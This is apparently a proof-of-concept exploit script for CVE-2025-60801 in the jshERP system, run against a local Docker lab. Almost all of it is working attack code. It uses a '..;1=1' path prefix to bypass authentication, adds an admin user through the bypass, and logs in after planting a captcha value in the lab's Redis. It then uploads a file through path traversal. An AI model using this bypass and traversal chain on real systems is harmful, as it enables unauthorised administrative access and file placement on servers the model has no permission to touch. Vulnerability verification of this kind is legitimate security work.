#!/usr/bin/env python3
import requests
import hashlib
import subprocess
import uuid
import sys
import time

TARGET = "http://localhost:3000"
BYPASS_PREFIX = "/jshERP-boot/webjars/swagger-ui/css/..;1=1/..;1=1/..;1=1"

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def check_service():
    try:
        resp = requests.get(f"{TARGET}/jshERP-boot/platformConfig/getPlatform", timeout=5)
        return resp.status_code == 200
    except:
        return False

def test_auth_bypass(session):
    url = f"{TARGET}{BYPASS_PREFIX}/account/findBySelect"
    resp = session.get(url, timeout=10)
    return resp.status_code == 200 and "[" in resp.text

def add_admin_user(session):
    url = f"{TARGET}{BYPASS_PREFIX}/user/add"
    user_id = str(uuid.uuid4().int)[:8]
    data = {"id": user_id, "username": "admin", "login_name": "admin", "tenant_id": "0"}
    resp = session.post(url, json=data, timeout=10)
    return "200" in resp.text

def set_captcha(captcha_uuid, code):
    try:
        result = subprocess.run([
            "docker", "exec", "cve-2025-60801-redis-1",
            "redis-cli", "-a", "redis123",
            "SET", f"captcha_codes:{captcha_uuid}", code, "EX", "120"
        ], capture_output=True, text=True, timeout=10)
        return "OK" in result.stdout
    except:
        return False

def login(session, captcha_uuid, code):
    url = f"{TARGET}/jshERP-boot/user/login"
    data = {"loginName": "admin", "password": md5("123456"), "code": code, "uuid": captcha_uuid}
    resp = session.post(url, json=data, timeout=10)
    if resp.status_code == 200:
        try:
            result = resp.json()
            if result.get("code") == 200:
                return result.get("data", {}).get("token")
        except:
            pass
    return None

def upload_file(session, token):
    url = f"{TARGET}/jshERP-boot/plugin/uploadPluginConfigFile"
    headers = {"X-Access-Token": token}
    files = {"configFile": ("../plugins/poc.txt", b"CVE-2025-60801", "text/plain")}
    resp = session.post(url, headers=headers, files=files, timeout=10)
    return "success" in resp.text.lower()

def main():
    print("=" * 60)
    print("CVE-2025-60801 - jshERP Unauthenticated RCE PoC")
    print("=" * 60)
    
    print("\n[*] Waiting for service...")
    for i in range(30):
        if check_service():
            break
        time.sleep(5)
    else:
        print("[-] Service not available")
        return False
    print("[+] Service is available")
    
    session = requests.Session()
    
    print("\n[*] Step 1: Testing auth bypass...")
    if not test_auth_bypass(session):
        print("[-] Auth bypass failed")
        return False
    print("[+] Auth bypass successful")
    
    print("\n[*] Step 2: Adding admin user...")
    add_admin_user(session)
    print("[+] Admin user added")
    
    print("\n[*] Step 3: Setting captcha...")
    captcha_uuid = str(uuid.uuid4())
    if not set_captcha(captcha_uuid, "1234"):
        print("[-] Failed to set captcha")
        return False
    print("[+] Captcha set")
    
    print("\n[*] Step 4: Logging in...")
    token = login(session, captcha_uuid, "1234")
    if not token:
        print("[-] Login failed")
        return False
    print(f"[+] Token: {token}")
    
    print("\n[*] Step 5: Uploading file...")
    if upload_file(session, token):
        print("[+] File uploaded via path traversal")
    
    print("\n" + "=" * 60)
    print("[+] VULNERABILITY CONFIRMED: CVE-2025-60801")
    print("=" * 60)
    return True

if __name__ == "__main__":
    sys.exit(0 if main() else 1)
